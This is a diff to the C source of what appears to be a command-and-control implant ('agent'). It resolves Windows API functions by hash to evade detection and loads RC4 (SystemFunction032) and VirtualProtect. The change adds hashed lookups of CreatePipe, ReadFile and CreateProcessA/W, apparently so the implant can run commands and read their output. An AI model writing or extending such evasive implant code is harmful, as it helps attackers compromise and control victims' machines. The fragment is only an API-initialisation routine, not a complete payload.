@@ -29,7 +29,7 @@ BYTE HashKeyBytes[] = HASH_KEY_BYTES;
 #endif
 
 UINT64 DllHashes[2] = { 0 };
-UINT64 ApiHashes[61] = { 0 };
+UINT64 ApiHashes[65] = { 0 };
 
 INT init_agent(PVOID RetAddress) {
 
@@ -243,6 +243,7 @@ INT init_agent(PVOID RetAddress) {
     if (!agent->apis->pGetUserNameA) {
         return -1;
     }
+
     agent->apis->pSystemFunction032 = (t_SystemFunction032)RetrieveFunctionPointerFromhash(agent->apis->hAdvapi32, ApiHashes[44]);
     if (!agent->apis->pSystemFunction032)
         return -1;
@@ -266,12 +267,29 @@ INT init_agent(PVOID RetAddress) {
 	if (!agent->apis->pGetSystemTimeAsFileTime) {
 		return -1;
 	}
+
     agent->apis->pVirtualProtect = (t_VirtualProtect)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[43]);
     if (!agent->apis->pVirtualProtect)
         return -1;
     
     agent->apis->pWaitForSingleObjectEx = (t_WaitForSingleObjectEx)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[45]);
     if (!agent->apis->pWaitForSingleObjectEx)
+        return -1;
+
+    agent->apis->pCreatePipe = (t_CreatePipe)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[61]);
+    if (!agent->apis->pCreatePipe)
+        return -1;
+
+    agent->apis->pReadFile = (t_ReadFile)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[62]);
+    if (!agent->apis->pReadFile)
+        return -1;
+
+    agent->apis->pCreateProcessA = (t_CreateProcessA)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[63]);
+    if (!agent->apis->pCreateProcessA)
+        return -1;
+
+    agent->apis->pCreateProcessW = (t_CreateProcessW)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[64]);
+    if (!agent->apis->pCreateProcessW)
         return -1;
 
     //obtain user32 apis
